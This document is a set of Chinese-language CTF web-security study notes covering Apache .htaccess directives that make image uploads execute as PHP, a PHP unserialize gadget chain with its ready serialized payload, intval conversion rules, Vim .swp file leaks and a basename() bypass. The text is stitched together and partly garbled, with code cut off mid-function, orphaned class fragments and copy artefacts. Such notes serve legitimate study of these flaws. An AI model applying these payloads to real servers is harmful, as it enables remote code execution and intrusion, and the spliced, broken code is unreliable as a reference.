## .htaccess解析漏洞

- `.htaccess` 是 **Apache 服务器**的一种 **目录级配置文件**，用于在**当前目录及其子目录**中重写服务器配置，而无需修改全局的 Apache 配置文件（`httpd.conf`）。
- 它的名称是缩写：**HyperText Access**。
- 本质：Apache 在处理请求时，会从请求路径的根目录开始逐级检查是否存在 `.htaccess` 文件，并在对应目录加载配置指令。

**http.conf文件中设置了 AllowOverried All ，才能使用.htaccess文件**

### 工作原理

Apache 接收到请求后，逐级检查目录：

```
/var/www/.htaccess
/var/www/html/.htaccess
/var/www/html/blog/.htaccess
```

每发现一个 `.htaccess` 文件，就会应用其中的指令。

因此多个 `.htaccess` 文件可以叠加生效（**子目录的会覆盖父目录的**）。

### 注意事项

- **性能问题**：每次请求都会检查 `.htaccess`，频繁 IO 可能影响性能；在高性能生产环境中建议直接改 `httpd.conf`。
- **安全问题**：如果错误配置 `AllowOverride` 或允许用户上传 `.htaccess` 文件，可能被用于上传漏洞或提权。
- **仅适用于 Apache**，Nginx 不支持 `.htaccess`，需在 `nginx.conf` 中配置。

#### 文件上传漏洞中利用.htaccess文件

通过上面介绍我们了解到.htaccess文件时存在于[Apachse](https://baike.baidu.com/item/Apache/0?fromModule=lemma_inlink)服务器中的，并且可以实现改变[文件扩展名](https://baike.baidu.com/item/文件扩展名/1270230?fromModule=lemma_inlink)的功能，并且主要作用于当前目录。

所以在利用时我们可以编写.htaccess将特定后缀名当作php解析。比如：

```bash
AddType application/x-httpd-php .jpg
```

当然也可以直接编写.htaccess为

```bash
SetHandler application/x-http-php
```

来设置当前目录中的所有文件都使用php解析。

也可以使用FilesMatch来匹配文件名，使特定文件名的文件当作php解析

```bash
<FilesMatch "xxx"> 
SetHandler application/x-httpd-php 
</FilesMatch>
```

## 利用链构造

链条由三个类组合而成：

```
w22m::__destruct()
 → echo $this->w00m
   → w33m::__toString()
     → $this->w00m->{$this->w22m}()
       → w44m::Getflag()
```

------

链条逐步详细执行

### **Step 1：unserialize 反序列化**

我们传入序列化后的 `w22m` 对象：

```
css复制编辑O:4:"w22m":1:{

    s:4:"w00m";O:4:"w44m":2:{
      s:10:"w44madmin";s:4:"w44m";
      s:7:"*passwd";s:5:"08067";
    }
    s:4:"w22m";s:7:"Getflag";
  }

```

- PHP 会根据序列化字符串，依次恢复出对象 `w22m → w33m → w44m`，并正确赋值属性。

------

### **Step 2：脚本执行完毕，触发 w22m::__destruct**

PHP 脚本执行完成后，所有对象会被销毁。销毁时会调用它们的析构方法。

```
public function __destruct(){
    echo $this->w00m;
}
```

- 因为 `$this->w00m` 是一个对象（`w33m`），`echo` 一个对象时，PHP 会调用该对象的 `__toString()`。

**接下来跳转到 `w33m::__toString`。**

------

### **Step 3：w33m::__toString 被调用**

```
public function __toString(){
    $this->w00m->{$this->w22m}();
    return 0;
}
```

- `$this->w00m` → 这里是 `w44m` 对象。
- `$this->w22m` → 是字符串 `"Getflag"`。

于是，这里执行：

```
$this->w00m->{$this->w22m}();  
// 等价于 $w44m->Getflag();
```

 直接调用 `w44m::Getflag()` 方法。

------

### **Step 4：w44m::Getflag 执行**

`Getflag` 方法内容：

```
public function Getflag(){
    if($this->admin === 'w44m' && $this->passwd ==='08067'){
        include('flag.php');
        echo $flag;
    }else{
        echo 'nono';
    }

关键点解析

### ① 为什么要用 `w22m::__destruct`

- 析构函数 `__destruct` **自动触发**，不需要显式调用。
- 我们利用它 `echo $this->w00m`，间接触发对象的 `__toString`。

### ② 为什么要用 `w33m::__toString`

- `__toString` 会在对象被当作字符串时自动调用。
- 它可以动态调用 `$this->w00m->{$this->w22m}()`，非常适合执行任意方法。

### ③ 为什么要伪造私有/受保护属性

- `w44m::Getflag` 检查了私有属性 `$admin` 和受保护属性 `$passwd`。
- 在 PHP 序列化中，私有属性被编码为 `\0类名\0属性`，受保护属性被编码为 `\0*\0属性`。
- 伪造时必须严格遵循这个命名格式，否则属性赋值不会生效。

    public $w22m;
}

class w22m{
    public $w00m;
}

// 构建对象链
$w44m = new w44m();

$w33m = new w33m();
$w33m->w00m = $w44m;
$w33m->w22m = 'Getflag';

$w22m = new w22m();
$w22m->w00m = $w33m;

```

## **`urlencode` **

**的目的主要是为了确保序列化字符串能够安全地放进 URL 参数中**，避免因为特殊字符导致请求被截断或解析错误。我们逐步来看：

------

### 为什么 `serialize()` 的结果需要编码？

`serialize()` 生成的字符串包含很多**特殊字符**，比如：

- `{`、`}`、`:`、`;`、`"`、`*`、`\0`（私有和受保护属性里会出现）

例如：

```
O:4:"w22m":1:{s:4:"w00m";O:4:"w33m":2:{s:4:"w00m";O:4:"w44m":2:{s:10:"w44madmin";s:4:"w44m";s:7:"*passwd";s:5:"08067";}s:4:"w22m";s:7:"Getflag";}}
```

如果直接放到 URL 里：

```
http://target.com/index.php?w00m=O:4:"w22m":1:{s:4:"w00m";O:...
```

浏览器和服务器可能会把 `:` 或 `"`、`{}` 等特殊字符当作 URL 控制符或分隔符，导致请求解析失败或被截断。

------

### URL 编码的作用

`urlencode()` 会将特殊字符转为百分号编码（%XX），确保传输安全：

```
O:4:"w22m":1:{...}
↓
O%3A4%3A%22w22m%22%3A1%3A%7B...
```

- `:` 变成 `%3A`
- `"` 变成 `%22`
- `{` 变成 `%7B`
- `}` 变成 `%7D`

这样浏览器、服务器都能将其视为普通字符串，不会打断参数传递。

------

### 为什么不能直接用 `serialize()` 结果？

如果不编码，常见的问题有：

1. **URL 解析错误**
    某些字符被误认为是分隔符（如 `&`），导致 GET 参数被截断。
2. **Web 服务器拒绝请求**
    部分安全策略（如 WAF）会检测非法 URL 字符（比如 `"`、`{}`）并阻止请求。
3. **自动转义/过滤**
    某些环境下会对特殊字符自动转义或丢弃，导致 unserialize 失败。

------

### 总结

- `serialize()` 生成的字符串直接包含 PHP 内部用的控制符号（`:`、`{}` 等），不能直接放进 URL。
- `urlencode()` 让它符合 URL 规范，确保传输正确。
- 服务器端接收后，`$_GET['w00m']` 会自动解码，还原成原始序列化字符串，再被 `unserialize()` 正确解析。

## intval

`intval()` 是 PHP 中用于将变量转换为整数类型的函数。

------

### **基本语法**

```
intval(mixed $value, int $base = 10): int
```

- **`$value`**：要转换的变量，可以是字符串、浮点数、布尔值、数组等。
- **`$base`**（可选）：进制，默认是 `10`（十进制），仅在 `$value` 为字符串且表示数字时有效（支持 2 到 36 进制）。

------

**返回值**

- 返回 `$value` 转换成的整数。
- 如果无法转换，则返回 `0`。
- 在布尔上下文中，**非零整数为 true，0 为 false**。

------

**转换规则**

#### **字符串 → 整数**

- `intval` 会从字符串开头开始解析：
  - 如果开头是数字或有效符号（`+`/`-`），读取连续数字部分。
  - 遇到非数字时停止解析。
  - 如果开头不是数字或符号，直接返回 `0`。

```
intval("123abc");   // 123
intval("  45");     // 45 (前导空格忽略)
intval("+99");      // 99
intval("-42");      // -42
intval("abc123");   // 0 (非数字开头)
intval("1e3");      // 1 (科学计数法符号被截断)
```

------

####  **浮点数 → 整数**

- 截断小数部分（不会四舍五入）。

```
intval(3.99);  // 3
intval(-2.7);  // -2
```

------

####  **布尔值 → 整数**

- `true` → `1`
- `false` → `0`

```
intval(true);   // 1
intval(false);  // 0
```

------

#### 数组 → 整数**

- 空数组 → `0`
- 非空数组 → `1`

```
intval([]);           // 0
intval([123]);        // 1
intval(["abc"]);      // 1
```

------

#### null` → 整数**

```
intval(null);  // 0
```

------

#### **进制转换（base 参数）**

如果 `$value` 是字符串且 `$base` 指定了进制：

```
intval("11", 2);   // 3   (二进制 11 -> 十进制 3)
intval("1A", 16);  // 26  (十六进制 1A -> 十进制 26)
```

注意：`base` 只对字符串有效。

## **Vim**

Vim 是一个 **基于命令行的文本编辑器**，是从早期的 **vi 编辑器** 发展而来的。它常用于编程、服务器环境或命令行下编辑文件，因为功能强大、占用资源少，几乎所有类 Unix 系统（Linux、macOS 等）都自带 Vim。

### Vim 的主要特点：

- **模式化编辑**：
   Vim 有多种模式（Normal、Insert、Visual、Command），不同模式下按键的作用不同。例如：
  - **Normal 模式**：用于浏览和操作文本（默认进入的模式）。
  - **Insert 模式**：用于输入文本（类似普通编辑器）。
  - **Command 模式**：用于执行命令，如保存、退出等（通过 `:` 进入）。
- **轻量高效**：
   Vim 在命令行环境下运行，启动速度快，不依赖图形界面。
- **可扩展性强**：
   支持插件、脚本配置，可定制化强。

------

## .swp 文件

`.swp` 文件是 Vim 在编辑文件时生成的 **交换文件（swap file）**，它的作用类似于**临时备份**，用于在意外退出（崩溃、断电、kill进程）时**恢复未保存的内容**。

### `.swp 文件的特点：`

- **命名规则**：
   当你用 Vim 打开 `example.txt` 文件时，会在同一目录生成 `.example.txt.swp` 文件。
   格式通常是：

  ```
  .文件名.swp
  ```

  或某些系统会用：

  ```
  .文件名.swo / .swp / .swq ...
  ```

  （主要用于多个 Vim 实例同时打开同一文件的情况。）

- **生成时机**：
   只要 Vim 打开一个文件，它就会生成 `.swp` 文件，直到你正常退出（`:wq` 或 `:q!`），它才会删除。

- **作用**：

  1. **防止冲突**：如果有另一个 Vim 实例在编辑同一文件，会检测到 `.swp` 并提示警告。

  2. **自动恢复**：如果编辑中途异常退出（未保存），下次打开该文件时 Vim 会提示你恢复内容：

     ```
     E325: ATTENTION
     Found a swap file by the name ".example.txt.swp"
     ...
     (1) Another program may be editing the same file.
     (2) An edit session for this file crashed.
     ```

------

### 3. **如何处理 .swp 文件？**

当遇到 `.swp` 文件时，一般有以下几种处理方式：

1. **恢复文件内容**：
    在 Vim 提示界面选择 `[R]`（Recover），恢复到崩溃前最后一次的编辑状态，然后重新保存文件：

   ```
   :wq
   ```

   `.swp` 文件会自动删除。

2. **删除 .swp 文件**（如果确认不需要恢复）：

   ```
   rm .example.txt.swp
   ```

3. **强制打开文件**（忽略 .swp 文件警告）：

   ```
   vim -r example.txt
   ```

   或者用：

   ```
   vim -n example.txt
   ```

   （不使用交换文件模式。）

------

### 4. **总结类比**

可以把 `.swp 文件`理解为：

- Windows 的 **临时文件（~$xxx.docx）**
- Word 自动保存的 **恢复文件**

而 Vim 本身就是一个专门用于命令行的强大文本编辑器，`.swp 文件`则是它的**自动备份和冲突检测机制**。

```
 http://example.com/foo/bar.php
```

- `\/*$` : 该部分用于匹配可选的斜杠（'/'）。'/*' 表示匹配零个或多个斜杠，'$' 表示匹配字符串的结尾。
- `i` : 该部分表示在匹配时忽略大小写。

综上所述：就是匹配以 `utils.php+0个或多个 / 结尾` 的字符串。

## basename() 函数绕过

basename 函数有这样一个特性：在使用默认语言环境设置时，basename() 会删除文件名开头的非 ASCII 字符。

比如：

| `$_SERVER['PHP_SELF']` 获取到的值 | basename() 函数处理后的结果 |
| --------------------------------- | --------------------------- |
| /dir/index.php                    | index.php                   |
| /dir/%ffindex.php                 | index.php                   |
| /dir/index.php/%ff                | index.php                   |
| /dir/index.php/%2b                | +                           |

上面的 %ff 就是一个非 ASCII 字符。而当路径的最后为 ASCII 字符时，basename 函数就会返回该字符。
